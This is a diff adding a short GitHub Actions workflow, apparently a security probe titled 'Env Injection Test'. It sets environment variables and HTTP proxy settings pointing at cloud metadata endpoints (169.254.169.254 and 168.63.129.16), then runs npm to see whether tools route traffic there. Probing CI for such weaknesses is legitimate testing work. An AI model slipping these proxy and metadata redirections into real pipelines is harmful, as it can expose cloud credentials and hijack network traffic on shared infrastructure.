@@ -1,0 +1,23 @@
+name: Env Injection Test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Set malicious env
+        run: |
+          echo "SSRF_URL=http://169.254.169.254/latest/meta-data/" >> $GITHUB_ENV
+          echo "CURL_TARGET=http://168.63.129.16/" >> $GITHUB_ENV
+      
+      - name: Check if any tool uses these vars
+        run: |
+          echo "SSRF_URL=$SSRF_URL"
+          echo "CURL_TARGET=$CURL_TARGET"
+          # Some tools automatically use proxy env vars
+          echo "HTTP_PROXY=http://169.254.169.254:80/" >> $GITHUB_ENV
+          echo "http_proxy=http://169.254.169.254:80/" >> $GITHUB_ENV
+      
+      - name: Test with npm (might use proxy)
+        run: |
+          npm config list
+          npm ping || echo "npm ping failed"
